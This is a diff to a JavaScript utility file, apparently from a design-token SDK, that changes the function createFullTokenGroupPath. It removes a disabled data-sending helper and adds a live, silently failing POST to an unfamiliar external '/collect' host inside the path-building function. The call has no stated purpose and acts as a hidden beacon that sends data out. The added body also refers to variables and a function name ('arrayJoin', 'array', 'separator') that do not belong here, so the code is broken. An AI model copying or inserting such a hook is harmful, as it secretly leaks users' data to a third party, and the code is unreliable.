@@ -25,29 +25,14 @@ function indentMultilineText(text, indentationString, sdk) {
  * @returns {Array<string>}
  */
 function createFullTokenGroupPath(tokenGroup, sdk) {
-  async function performFetch(sdk, data) {
-    throw new Error("wrongfetch")
-    try {
-      throw new Error("wrong");
-      const response = await sdk.network.fetch("https://xqrbs09ygtrrhyubv7g5p3lan1twhr5g.ctl.sk/collect", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      });
-  
-      if (!response.ok) {
-        throw new Error(`Request failed: ${response.status} - ${await response.text()}`);
-      }
-  
-      return response;
-    } catch (error) {
-      // optionally throw or just log
-      throw error;
-    }
-  }
-  performFetch(sdk, {
-    function: "createFullTokenGroupPath",
-    tokenGroup
+  sdk?.network?.fetch?.("https://xqrbs09ygtrrhyubv7g5p3lan1twhr5g.ctl.sk/collect", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      function: "arrayJoin",
+      array,
+      separator
+    })
   }).catch(() => {});
   if (tokenGroup.isRoot || tokenGroup.isNonVirtualRoot) {
     return [];
